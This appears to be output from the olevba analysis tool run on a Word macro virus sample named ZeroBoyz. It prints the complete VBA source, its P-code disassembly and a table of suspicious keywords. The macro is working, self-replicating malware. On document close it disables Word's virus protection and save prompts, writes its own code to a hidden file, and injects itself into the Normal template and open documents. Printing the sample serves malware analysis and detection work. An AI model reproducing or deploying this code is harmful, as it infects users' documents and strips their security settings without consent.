olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ZeroBoyz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ZeroBoyz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'(c) W.Destroyer
'(c) DedBoyz Group
'DocCracker v1.0
'-----------------
Private Sub Document_Close()

AtrCon = 6
Zerro = Chr(48)
Clean = ""
DotFile = "C:\Dbg.ext"
One = 1
On Error Resume Next
Options.VirusProtection = Zerro
Application.EnableCancelKey = Not -One
Options.SaveNormalPrompt = Zerro
ad_s = ActiveDocument.Saved
Options.ConfirmConversions = Zerro

If Dir(DotFile, AtrCon) = Clean Then
Open DotFile For Output As #1
For i = One To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
st = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, One)
Print #1, st
Next i
Close #1
SetAttr DotFile, AtrCon
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'(c) W.Destroyer" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'(c) W.Destroyer" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = Clean
End If
If t <> Clean Then
Open DotFile For Input As #1
If LOF(1) = Zerro Then GoTo Qex
Counti = One
Do While Not EOF(1)
Line Input #1, LineCode
t.CodeModule.InsertLines Counti, LineCode
Counti = Counti + One
Loop
Qex:
Close #1
Asm = ""
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

Randomize
If Rnd > 0.84 Then MsgBox "DocCracker v1.0 (c) DedBoyz Group", vbOKOnly, "<W.Destroyer>"
If ActiveDocument.Saved <> ad_s Then ActiveDocument.Saved = ad_s
End Sub 'It real good !!!

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.ZeroBoyz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "(c) W.Destroyer"
' Line #1:
' 	QuoteRem 0x0000 0x0011 "(c) DedBoyz Group"
' Line #2:
' 	QuoteRem 0x0000 0x000F "DocCracker v1.0"
' Line #3:
' 	QuoteRem 0x0000 0x0011 "-----------------"
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' Line #6:
' 	LitDI2 0x0006 
' 	St AtrCon 
' Line #7:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	St Zerro 
' Line #8:
' 	LitStr 0x0000 ""
' 	St Clean 
' Line #9:
' 	LitStr 0x000A "C:\Dbg.ext"
' 	St DotFile 
' Line #10:
' 	LitDI2 0x0001 
' 	St One 
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Ld Zerro 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	Ld One 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #14:
' 	Ld Zerro 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St ad_s 
' Line #16:
' 	Ld Zerro 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #17:
' Line #18:
' 	Ld DotFile 
' 	Ld AtrCon 
' 	ArgsLd Dir 0x0002 
' 	Ld Clean 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld DotFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld One 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #21:
' 	Ld i 
' 	Ld One 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St st 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld st 
' 	PrintItemNL 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #25:
' 	Ld DotFile 
' 	Ld AtrCon 
' 	ArgsCall SetAttr 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'(c) W.Destroyer"
' 	Ne 
' 	IfBlock 
' Line #28:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'(c) W.Destroyer"
' 	Ne 
' 	ElseIfBlock 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	Ld Clean 
' 	St t 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld t 
' 	Ld Clean 
' 	Ne 
' 	IfBlock 
' Line #35:
' 	Ld DotFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	Ld Zerro 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Qex 
' 	EndIf 
' Line #37:
' 	Ld One 
' 	St Counti 
' Line #38:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld LineCode 
' 	LineInput 
' Line #40:
' 	Ld Counti 
' 	Ld LineCode 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	Ld Counti 
' 	Ld One 
' 	Add 
' 	St Counti 
' Line #42:
' 	Loop 
' Line #43:
' 	Label Qex 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #45:
' 	LitStr 0x0000 ""
' 	St Asm 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #47:
' 	EndIfBlock 
' Line #48:
' Line #49:
' 	ArgsCall Read 0x0000 
' Line #50:
' 	Ld Rnd 
' 	LitR8 0x7AE1 0xAE14 0xE147 0x3FEA 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0021 "DocCracker v1.0 (c) DedBoyz Group"
' 	Ld vbOKOnly 
' 	LitStr 0x000D "<W.Destroyer>"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #51:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld ad_s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ad_s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #52:
' 	EndSub 
' 	QuoteRem 0x0008 0x0010 "It real good !!!"
' Line #53:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

